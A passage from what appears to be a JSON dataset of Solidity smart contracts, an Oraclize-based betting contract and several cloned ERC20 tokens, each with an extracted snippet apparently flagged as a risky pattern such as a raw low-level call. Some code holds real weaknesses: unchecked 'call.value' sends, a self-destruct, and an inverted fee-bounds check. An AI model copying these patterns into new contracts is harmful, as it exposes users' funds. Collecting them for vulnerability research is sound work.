(decimals){\n if (_b == 0) break;\n else _b--;\n }\n mint *= 10;\n mint += uint(bresult[i]) - 48;\n } else if (bresult[i] == 46) decimals = true;\n }\n if (_b > 0) mint *= 10**_b;\n return mint;\n }\n function uint2str(uint i) internal returns (string){\n if (i == 0) return \"0\";\n uint j = i;\n uint len;\n while (j != 0){\n len++;\n j /= 10;\n }\n bytes memory bstr = new bytes(len);\n uint k = len - 1;\n while (i != 0){\n bstr[k--] = byte(48 + i % 10);\n i /= 10;\n }\n return string(bstr);\n }\n function stra2cbor(string[] arr) internal returns (bytes) {\n uint arrlen = arr.length;\n uint outputlen = 0;\n bytes[] memory elemArray = new bytes[](arrlen);\n for (uint i = 0; i < arrlen; i++) {\n elemArray[i] = (bytes(arr[i]));\n outputlen += elemArray[i].length + (elemArray[i].length - 1)/23 + 3;\n }\n uint ctr = 0;\n uint cborlen = arrlen + 0x80;\n outputlen += byte(cborlen).length;\n bytes memory res = new bytes(outputlen);\n while (byte(cborlen).length > ctr) {\n res[ctr] = byte(cborlen)[ctr];\n ctr++;\n }\n for (i = 0; i < arrlen; i++) {\n res[ctr] = 0x5F;\n ctr++;\n for (uint x = 0; x < elemArray[i].length; x++) {\n if (x % 23 == 0) {\n uint elemcborlen = elemArray[i].length - x >= 24 ? 23 : elemArray[i].length - x;\n elemcborlen += 0x40;\n uint lctr = ctr;\n while (byte(elemcborlen).length > ctr - lctr) {\n res[ctr] = byte(elemcborlen)[ctr - lctr];\n ctr++;\n }\n }\n res[ctr] = elemArray[i][x];\n ctr++;\n }\n res[ctr] = 0xFF;\n ctr++;\n }\n return res;\n }\n function ba2cbor(bytes[] arr) internal returns (bytes) {\n uint arrlen = arr.length;\n uint outputlen = 0;\n bytes[] memory elemArray = new bytes[](arrlen);\n for (uint i = 0; i < arrlen; i++) {\n elemArray[i] = (bytes(arr[i]));\n outputlen += elemArray[i].length + (elemArray[i].length - 1)/23 + 3;\n }\n uint ctr = 0;\n uint cborlen = arrlen + 0x80;\n outputlen += byte(cborlen).length;\n bytes memory res = new bytes(outputlen);\n while (byte(cborlen).length > ctr) {\n res[ctr] = byte(cborlen)[ctr];\n ctr++;\n }\n for (i = 0; i < arrlen; i++) {\n res[ctr] = 0x5F;\n ctr++;\n for (uint x = 0; x < elemArray[i].length; x++) {\n if (x % 23 == 0) {\n uint elemcborlen = elemArray[i].length - x >= 24 ? 23 : elemArray[i].length - x;\n elemcborlen += 0x40;\n uint lctr = ctr;\n while (byte(elemcborlen).length > ctr - lctr) {\n res[ctr] = byte(elemcborlen)[ctr - lctr];\n ctr++;\n }\n }\n res[ctr] = elemArray[i][x];\n ctr++;\n }\n res[ctr] = 0xFF;\n ctr++;\n }\n return res;\n }\n string oraclize_network_name;\n function oraclize_setNetworkName(string _network_name) internal {\n oraclize_network_name = _network_name;\n }\n function oraclize_getNetworkName() internal returns (string) {\n return oraclize_network_name;\n }\n function oraclize_newRandomDSQuery(uint _delay, uint _nbytes, uint _customGasLimit) internal returns (bytes32){\n if ((_nbytes == 0)||(_nbytes > 32)) throw;\n bytes memory nbytes = new bytes(1);\n nbytes[0] = byte(_nbytes);\n bytes memory unonce = new bytes(32);\n bytes memory sessionKeyHash = new bytes(32);\n bytes32 sessionKeyHash_bytes32 = oraclize_randomDS_getSessionPubKeyHash();\n assembly {\n mstore(unonce, 0x20)\n mstore(add(unonce, 0x20), xor(blockhash(sub(number, 1)), xor(coinbase, timestamp)))\n mstore(sessionKeyHash, 0x20)\n mstore(add(sessionKeyHash, 0x20), sessionKeyHash_bytes32)\n }\n bytes[3] memory args = [unonce, nbytes, sessionKeyHash];\n bytes32 queryId = oraclize_query(_delay, \"random\", args, _customGasLimit);\n oraclize_randomDS_setCommitment(queryId, sha3(bytes8(_delay), args[1], sha256(args[0]), args[2]));\n return queryId;\n }\n function oraclize_randomDS_setCommitment(bytes32 queryId, bytes32 commitment) internal {\n oraclize_randomDS_args[queryId] = commitment;\n }\n mapping(bytes32=>bytes32) oraclize_randomDS_args;\n mapping(bytes32=>bool) oraclize_randomDS_sessionKeysHashVerified;\n function verifySig(bytes32 tosignh, bytes dersig, bytes pubkey) internal returns (bool){\n bool sigok;\n address signer;\n bytes32 sigr;\n bytes32 sigs;\n bytes memory sigr_ = new bytes(32);\n uint offset = 4+(uint(dersig[3]) - 0x20);\n sigr_ = copyBytes(dersig, offset, 32, sigr_, 0);\n bytes memory sigs_ = new bytes(32);\n offset += 32 + 2;\n sigs_ = copyBytes(dersig, offset+(uint(dersig[offset-1]) - 0x20), 32, sigs_, 0);\n assembly {\n sigr := mload(add(sigr_, 32))\n sigs := mload(add(sigs_, 32))\n }\n (sigok, signer) = safer_ecrecover(tosignh, 27, sigr, sigs);\n if (address(sha3(pubkey)) == signer) return true;\n else {\n (sigok, signer) = safer_ecrecover(tosignh, 28, sigr, sigs);\n return (address(sha3(pubkey)) == signer);\n }\n }\n function oraclize_randomDS_proofVerify__sessionKeyValidity(bytes proof, uint sig2offset) internal returns (bool) {\n bool sigok;\n bytes memory sig2 = new bytes(uint(proof[sig2offset+1])+2);\n copyBytes(proof, sig2offset, sig2.length, sig2, 0);\n bytes memory appkey1_pubkey = new bytes(64);\n copyBytes(proof, 3+1, 64, appkey1_pubkey, 0);\n bytes memory tosign2 = new bytes(1+65+32);\n tosign2[0] = 1;\n copyBytes(proof, sig2offset-65, 65, tosign2, 1);\n bytes memory CODEHASH = hex\"fd94fa71bc0ba10d39d464d0d8f465efeef0a2764e3887fcc9df41ded20f505c\";\n copyBytes(CODEHASH, 0, 32, tosign2, 1+65);\n sigok = verifySig(sha256(tosign2), sig2, appkey1_pubkey);\n if (sigok == false) return false;\n bytes memory LEDGERKEY = hex\"7fb956469c5c9b89840d55b43537e66a98dd4811ea0a27224272c2e5622911e8537a2f8e86a46baec82864e98dd01e9ccc2f8bc5dfc9cbe5a91a290498dd96e4\";\n bytes memory tosign3 = new bytes(1+65);\n tosign3[0] = 0xFE;\n copyBytes(proof, 3, 65, tosign3, 1);\n bytes memory sig3 = new bytes(uint(proof[3+65+1])+2);\n copyBytes(proof, 3+65, sig3.length, sig3, 0);\n sigok = verifySig(sha256(tosign3), sig3, LEDGERKEY);\n return sigok;\n }\n modifier oraclize_randomDS_proofVerify(bytes32 _queryId, string _result, bytes _proof) {\n if ((_proof[0] != \"L\")||(_proof[1] != \"P\")||(_proof[2] != 1)) throw;\n bool proofVerified = oraclize_randomDS_proofVerify__main(_proof, _queryId, bytes(_result), oraclize_getNetworkName());\n if (proofVerified == false) throw;\n _;\n }\n function oraclize_randomDS_proofVerify__returnCode(bytes32 _queryId, string _result, bytes _proof) internal returns (uint8){\n if ((_proof[0] != \"L\")||(_proof[1] != \"P\")||(_proof[2] != 1)) return 1;\n bool proofVerified = oraclize_randomDS_proofVerify__main(_proof, _queryId, bytes(_result), oraclize_getNetworkName());\n if (proofVerified == false) return 2;\n return 0;\n }\n function matchBytes32Prefix(bytes32 content, bytes prefix) internal returns (bool){\n bool match_ = true;\n for (var i=0; i<prefix.length; i++){\n if (content[i] != prefix[i]) match_ = false;\n }\n return match_;\n }\n function oraclize_randomDS_proofVerify__main(bytes proof, bytes32 queryId, bytes result, string context_name) internal returns (bool){\n bool checkok;\n uint ledgerProofLength = 3+65+(uint(proof[3+65+1])+2)+32;\n bytes memory keyhash = new bytes(32);\n copyBytes(proof, ledgerProofLength, 32, keyhash, 0);\n checkok = (sha3(keyhash) == sha3(sha256(context_name, queryId)));\n if (checkok == false) return false;\n bytes memory sig1 = new bytes(uint(proof[ledgerProofLength+(32+8+1+32)+1])+2);\n copyBytes(proof, ledgerProofLength+(32+8+1+32), sig1.length, sig1, 0);\n checkok = matchBytes32Prefix(sha256(sig1), result);\n if (checkok == false) return false;\n bytes memory commitmentSlice1 = new bytes(8+1+32);\n copyBytes(proof, ledgerProofLength+32, 8+1+32, commitmentSlice1, 0);\n bytes memory sessionPubkey = new bytes(64);\n uint sig2offset = ledgerProofLength+32+(8+1+32)+sig1.length+65;\n copyBytes(proof, sig2offset-64, 64, sessionPubkey, 0);\n bytes32 sessionPubkeyHash = sha256(sessionPubkey);\n if (oraclize_randomDS_args[queryId] == sha3(commitmentSlice1, sessionPubkeyHash)){\n delete oraclize_randomDS_args[queryId];\n } else return false;\n bytes memory tosign1 = new bytes(32+8+1+32);\n copyBytes(proof, ledgerProofLength, 32+8+1+32, tosign1, 0);\n checkok = verifySig(sha256(tosign1), sig1, sessionPubkey);\n if (checkok == false) return false;\n if (oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash] == false){\n oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash] = oraclize_randomDS_proofVerify__sessionKeyValidity(proof, sig2offset);\n }\n return oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash];\n }\n function copyBytes(bytes from, uint fromOffset, uint length, bytes to, uint toOffset) internal returns (bytes) {\n uint minLength = length + toOffset;\n if (to.length < minLength) {\n throw;\n }\n uint i = 32 + fromOffset;\n uint j = 32 + toOffset;\n while (i < (32 + fromOffset + length)) {\n assembly {\n let tmp := mload(add(from, i))\n mstore(add(to, j), tmp)\n }\n i += 32;\n j += 32;\n }\n return to;\n }\n function safer_ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal returns (bool, address) {\n bool ret;\n address addr;\n assembly {\n let size := mload(0x40)\n mstore(size, hash)\n mstore(add(size, 32), v)\n mstore(add(size, 64), r)\n mstore(add(size, 96), s)\n ret := call(3000, 1, 0, size, 128, size, 32)\n addr := mload(size)\n }\n return (ret, addr);\n }\n function ecrecovery(bytes32 hash, bytes sig) internal returns (bool, address) {\n bytes32 r;\n bytes32 s;\n uint8 v;\n if (sig.length != 65)\n return (false, 0);\n assembly {\n r := mload(add(sig, 32))\n s := mload(add(sig, 64))\n v := byte(0, mload(add(sig, 96)))\n }\n if (v < 27)\n v += 27;\n if (v != 27 && v != 28)\n return (false, 0);\n return safer_ecrecover(hash, v, r, s);\n }\n}\ncontract BananaGame is usingOraclize{\n uint constant times = 16;\n uint safeGas = 2300;\n uint ORACLIZE_GAS_LIMIT = 130000;\n uint percent = 95;\n uint minBet =2 finney;\n address public owner;\n bool public isStopped;\n uint public maxInvestors = 10;\n uint public divestFee = 50;\n address public houseAddress;\n mapping (bytes32 => Bet) public bets;\n bytes32[] public betsKeys;\n uint public investorsNum = 0;\n mapping(address => uint) public investorIDs;\n mapping(uint => Investor) public investors;\n uint public investorsProfit = 0;\n uint public investorsLosses = 0;\n bool profitDistributed;\n uint public invest;\n event LOG_OwnerAddressChanged(address owner,address newOwner);\n event LOG_NewBet(address addr, uint value);\n event LOG_ContractStopped();\n event LOG_GasLimitChanged(uint oldGasLimit, uint newGasLimit);\n event LOG_FailedSend(address receiver, uint amount);\n event LOG_ZeroSend();\n event LOG_ValueIsTooBig();\n event LOG_SuccessfulSend(address receiver,uint amountBet,uint profit);\n event LOG_CurrentPercent(uint percent);\n event LOG_SuccessfulDraw(address addr,uint value);\n event LOG_FailedDraw(address addr,uint value);\n event LOG_InvestorCapitalUpdate(address investor, int amount);\n event LOG_EmergencyAutoStop();\n event LOG_InvestorEntrance(address investor, uint amount,uint ways);\n event LOG_MaxInvestorsChanged(uint value);\n struct Bet{\n address playerAddr;\n uint amountBet;\n bytes betResult;\n }\n struct Investor {\n address investorAddress;\n uint amountInvested;\n uint originInvested;\n }\n modifier onlyOwner{\n if(msg.sender!=owner) throw;\n _;\n }\n modifier onlyOraclize{\n if(msg.sender !=oraclize_cbAddress()) throw;\n _;\n }\n modifier onlyIfNotStopped{\n if(isStopped) throw;\n _;\n }\n modifier onlyIfValidGas(uint newGasLimit) {\n if (ORACLIZE_GAS_LIMIT + newGasLimit < ORACLIZE_GAS_LIMIT) throw;\n if (newGasLimit < 1000) throw;\n _;\n }\n modifier checkBetValue(uint value){\n if(value<getMinBetAmount() ||value>getMaxBetAmount()) throw;\n _;\n }\n modifier onlyIfBetExist(bytes32 myid) {\n if(bets[myid].playerAddr == address(0x0)) throw;\n _;\n }\n modifier onlyIfNotProcessed(bytes32 myid) {\n if (bets[myid].betResult.length >=times) throw;\n _;\n }\n modifier onlyIfProfitNotDistributed {\n if (!profitDistributed) {\n _;\n }\n }\n modifier onlyInvestors {\n if (investorIDs[msg.sender] == 0) throw;\n _;\n }\n modifier onlyMoreThanZero {\n if (msg.value == 0) throw;\n _;\n }\n modifier validInvestNum(uint n){\n if(n>investorsNum) throw;\n _;\n }\n function BananaGame(){\n oraclize_setProof(proofType_TLSNotary | proofStorage_IPFS);\n owner = msg.sender;\n houseAddress = msg.sender;\n }\n function () payable{\n bet();\n }\n function bet() payable onlyIfNotStopped checkBetValue(msg.value){\n uint oraclizeFee = OraclizeI(OAR.getAddress()).getPrice(\"URL\", ORACLIZE_GAS_LIMIT + safeGas);\n if (oraclizeFee >= msg.value) throw;\n uint betValue = msg.value - oraclizeFee;\n LOG_NewBet(msg.sender,betValue);\n bytes32 myid =\n oraclize_query(\n \"nested\",\n \"[URL] ['json(https:\n ORACLIZE_GAS_LIMIT + safeGas\n );\n bets[myid] = Bet(msg.sender, betValue, \"\");\n betsKeys.push(myid);\n }\n function __callback(bytes32 myid, string result, bytes proof) onlyOraclize onlyIfBetExist(myid)\n onlyIfNotProcessed(myid) {\n bytes memory queue = bytes(result);\n string memory sd_s =new string(times);\n bytes memory sd = bytes(sd_s);\n uint k=0;\n if(queue.length<times){\n return;\n }\n Bet user = bets[myid];\n uint initAccount=user.amountBet;\n initAccount = initAccount*percent/100;\n uint getAccount;\n bool computeOrNot=true;\n for(uint i=0 ;i<queue.length;i++){\n if(queue[i]==48){\n sd[k] =queue[i];\n if(computeOrNot){\n computeOrNot=false;\n }\n k++;\n if(k>times-1){\n break;\n }\n }else if(queue[i]==49){\n if(computeOrNot){\n if(getAccount+initAccount<getAccount||initAccount+getAccount<initAccount){\n throw;\n }\n getAccount +=initAccount;\n initAccount = initAccount*percent/100;\n }\n sd[k] =queue[i];\n k++;\n if(k>times-1){\n break;\n }\n }\n }\n if(getAccount!=0){\n safeSend(user.playerAddr,user.amountBet,getAccount);\n }else{\n safeSend(user.playerAddr,user.amountBet,1);\n }\n user.betResult = sd;\n delete profitDistributed;\n }\n function safeSend(address addr,uint amount,uint value) internal{\n if (value == 0) {\n LOG_ZeroSend();\n return;\n }\n if (this.balance < value) {\n LOG_ValueIsTooBig();\n return;\n }\n if (!(addr.call.gas(safeGas).value(value)())) {\n LOG_FailedSend(addr, value);\n }\n if((int)(value-amount)>0){\n investorsLosses +=value-amount;\n }else{\n investorsProfit +=amount-value;\n }\n LOG_SuccessfulSend(addr,amount,value);\n }\n function safeSend(address addr,uint value) internal{\n if (value == 0) {\n LOG_ZeroSend();\n return;\n }\n if (this.balance < value) {\n LOG_ValueIsTooBig();\n return;\n }\n if (!(addr.call.gas(safeGas).value(value)())) {\n LOG_FailedSend(addr, value);\n }\n }\n function setStopped() onlyOwner{\n isStopped =true;\n LOG_ContractStopped();\n }\n function setStarted() onlyOwner{\n isStopped =false;\n }\n function getBetNum() constant returns (uint){\n return betsKeys.length;\n }\n function getBet(uint id) constant returns(address,uint,string){\n if (id < betsKeys.length) {\n bytes32 betKey = betsKeys[id];\n return (bets[betKey].playerAddr, bets[betKey].amountBet, (string)(bets[betKey].betResult));\n }\n }\n function changeOwnerAddress(address newOwner)\n onlyOwner {\n if (newOwner == address(0x0)) throw;\n owner = newOwner;\n LOG_OwnerAddressChanged(owner, newOwner);\n }\n function changeGasLimitOfSafeSend(uint newGasLimit)\n onlyOwner\n onlyIfValidGas(newGasLimit) {\n safeGas = newGasLimit;\n LOG_GasLimitChanged(safeGas, newGasLimit);\n }\n function changePercent(uint _percent) onlyOwner{\n if(_percent<0 || _percent>100) throw;\n percent = _percent;\n }\n function watchPercent() constant returns (uint){\n return percent;\n }\n function changeOraclizeProofType(byte _proofType)\n onlyOwner {\n if (_proofType == 0x00) throw;\n oraclize_setProof( _proofType | proofStorage_IPFS );\n }\n function changeOraclizeConfig(bytes32 _config)\n onlyOwner {\n oraclize_setConfig(_config);\n }\n function getMinBetAmount()\n constant\n returns(uint) {\n uint oraclizeFee = OraclizeI(OAR.getAddress()).getPrice(\"URL\", ORACLIZE_GAS_LIMIT + safeGas);\n return minBet+oraclizeFee;\n }\n function getMaxBetAmount() constant returns (uint){\n uint oraclizeFee = OraclizeI(OAR.getAddress()).getPrice(\"URL\", ORACLIZE_GAS_LIMIT + safeGas);\n return oraclizeFee+getBankroll()*(100-percent)/100;\n }\n function getPlayerBetResult(uint i) constant returns (string){\n if(i>=0 && i< betsKeys.length){\n bytes32 id =betsKeys[i];\n Bet player = bets[id];\n return string(player.betResult);\n }else{\n throw;\n }\n }\n function getLossesShare(address currentInvestor)\n constant\n returns (uint) {\n return investors[investorIDs[currentInvestor]].amountInvested * (investorsLosses) / invest;\n }\n function getProfitShare(address currentInvestor)\n constant\n returns (uint) {\n return investors[investorIDs[currentInvestor]].amountInvested * (investorsProfit) / invest;\n }\n function getBalance(address currentInvestor) constant returns(uint){\n uint invested = investors[investorIDs[currentInvestor]].amountInvested;\n uint profit = getProfitShare(currentInvestor);\n uint losses = getLossesShare(currentInvestor);\n if ((invested + profit < profit) ||\n (invested + profit < invested) ||\n (invested + profit < losses))\n return 0;\n else\n return invested + profit - losses;\n }\n function profitDistribution()\n internal\n onlyIfProfitNotDistributed {\n uint copyInvested;\n for (uint i = 1; i <= investorsNum; i++) {\n address currentInvestor = investors[i].investorAddress;\n uint profitOfInvestor = getProfitShare(currentInvestor);\n uint lossesOfInvestor = getLossesShare(currentInvestor);\n if ((investors[i].amountInvested + profitOfInvestor >= investors[i].amountInvested) &&\n (investors[i].amountInvested + profitOfInvestor >= lossesOfInvestor)) {\n investors[i].amountInvested += profitOfInvestor - lossesOfInvestor;\n LOG_InvestorCapitalUpdate(currentInvestor, (int) (profitOfInvestor - lossesOfInvestor));\n }\n else {\n isStopped = true;\n LOG_EmergencyAutoStop();\n }\n if (copyInvested + investors[i].amountInvested >= copyInvested)\n copyInvested += investors[i].amountInvested;\n }\n delete investorsProfit;\n delete investorsLosses;\n invest = copyInvested;\n profitDistributed = true;\n }\n function divest()\n onlyInvestors {\n divest(msg.sender);\n }\n function divest(address currentInvestor)\n internal{\n profitDistribution();\n uint currentID = investorIDs[currentInvestor];\n uint amountToReturn = getBalance(currentInvestor);\n if ((invest >= investors[currentID].amountInvested)) {\n invest -= investors[currentID].amountInvested;\n uint divestFeeAmount = (amountToReturn*divestFee)/10000;\n amountToReturn -= divestFeeAmount;\n delete investors[currentID];\n delete investorIDs[currentInvestor];\n if (currentID != investorsNum) {\n Investor lastInvestor = investors[investorsNum];\n investorIDs[lastInvestor.investorAddress] = currentID;\n investors[currentID] = lastInvestor;\n delete investors[investorsNum];\n }\n investorsNum--;\n safeSend(currentInvestor, amountToReturn);\n safeSend(houseAddress, divestFeeAmount);\n LOG_InvestorEntrance(msg.sender, amountToReturn,3);\n } else {\n isStopped = true;\n LOG_EmergencyAutoStop();\n }\n }\n function addInvest() payable onlyIfNotStopped onlyMoreThanZero{\n if(investorIDs[msg.sender]>0){\n profitDistribution();\n investors[investorIDs[msg.sender]].amountInvested += msg.value;\n investors[investorIDs[msg.sender]].originInvested += msg.value;\n invest += msg.value;\n LOG_InvestorEntrance(msg.sender, msg.value,2);\n }else{\n if(msg.value>getMinInvestment()){\n profitDistribution();\n if(investorsNum==maxInvestors){\n uint minId = searchSmallestInvestor();\n divest(investors[minId].investorAddress);\n }\n investorsNum++;\n addInvestorAtID(investorsNum);\n }else{\n throw;\n }\n }\n }\n function addInvestorAtID(uint id)\n internal {\n investorIDs[msg.sender] = id;\n investors[id].investorAddress = msg.sender;\n investors[id].amountInvested = msg.value;\n investors[id].originInvested = msg.value;\n invest += msg.value;\n LOG_InvestorEntrance(msg.sender, msg.value,1);\n }\n function getMinInvestment()\n constant\n returns(uint) {\n if (investorsNum == maxInvestors) {\n uint investorID = searchSmallestInvestor();\n return getBalance(investors[investorID].investorAddress);\n }\n else {\n return 0;\n }\n }\n function searchSmallestInvestor()\n constant\n returns(uint) {\n uint investorID = investorsNum;\n for (uint i = investorsNum; i >=1 ; i--) {\n if (getBalance(investors[i].investorAddress) < getBalance(investors[investorID].investorAddress)) {\n investorID = i;\n }\n }\n return investorID;\n }\n function forceDivestOfAllInvestors()\n onlyOwner {\n uint copyNumInvestors = investorsNum;\n for (uint i = 1; i <= copyNumInvestors; i++) {\n divest(investors[1].investorAddress);\n }\n }\n function changeInvestNum(uint num) onlyOwner{\n if(num <= investorsNum ) throw;\n maxInvestors = num;\n LOG_MaxInvestorsChanged(num);\n }\n function changeDivestFee(uint value) onlyOwner{\n if(value<0 || value>10000){\n divestFee = value;\n }\n }\n function getBankroll()\n constant\n returns(uint) {\n if ((invest < investorsProfit) ||\n (invest + investorsProfit < invest) ||\n (invest + investorsProfit < investorsLosses)) {\n return 0;\n }\n else {\n return invest + investorsProfit - investorsLosses;\n }\n }\n function getStatus() constant returns(uint,uint,uint,uint){\n uint bankroll = getBankroll();\n uint minBet = getMinBetAmount();\n uint maxBet = getMaxBetAmount();\n return (bankroll,minBet,maxBet,investorsNum);\n }\n function getInvestStatus(uint n) validInvestNum(n) constant returns(address,uint,uint ) {\n address addr = investors[n].investorAddress;\n uint originInvested = investors[n].originInvested;\n uint currentCaptial = getBalance(addr)*(10000-divestFee)/10000;\n return (addr,originInvested,currentCaptial);\n }\n function changeMinBet(uint value) onlyOwner{\n if(value<0 || value >getBankroll()*(100-percent)/100) throw;\n minBet = value;\n }\n function changeORACLIZE_GAS_LIMIT(uint value) onlyOwner{\n ORACLIZE_GAS_LIMIT =value;\n }\n function getOraFee() constant returns (uint){\n return OraclizeI(OAR.getAddress()).getPrice(\"URL\", ORACLIZE_GAS_LIMIT + safeGas);\n }\n function getBetKey(uint i) constant returns (bytes32){\n return betsKeys[i];\n }\n function changeHouseAddress(address addr) onlyOwner{\n if (addr == address(0x0)) throw;\n houseAddress = addr;\n }\n function destroy() onlyOwner{\n forceDivestOfAllInvestors();\n suicide(owner);\n }\n}",
  "extract_feature": [
    "function safer_ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal returns (bool, address) {\nbool ret;\naddress addr;\nassembly {\nlet size := mload(0x40)\nmstore(size, hash)\nmstore(add(size, 32), v)\nmstore(add(size, 64), r)\nmstore(add(size, 96), s)\nret := call(3000, 1, 0, size, 128, size, 32)\naddr := mload(size)\n}\nreturn (ret, addr);\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb159e"
  },
  "filename": "35155.sol",
  "content": "pragma solidity ^0.4.4;\ncontract BicodeToken {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract BicodeBIC is BicodeToken {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract BICODE is BicodeBIC {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function BICODE(\n ) {\n balances[msg.sender] = 10000000000000;\n totalSupply = 10000000000000;\n name = \"BiCode\";\n decimals = 8;\n symbol = \"CODE\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb159f"
  },
  "filename": "35156.sol",
  "content": "pragma solidity ^0.4.4;\ncontract BicodeToken {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract BicodeBIC is BicodeToken {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract BICODE is BicodeBIC {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function BICODE(\n ) {\n balances[msg.sender] = 10000000000000;\n totalSupply = 10000000000000;\n name = \"Bicode\";\n decimals = 8;\n symbol = \"ORG\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15a0"
  },
  "filename": "35165.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract Jdini is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function Jdini(\n ) {\n balances[msg.sender] = 6553600;\n totalSupply = 6553600;\n name = \"jdini\";\n decimals = 2;\n symbol = \"JDI\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = 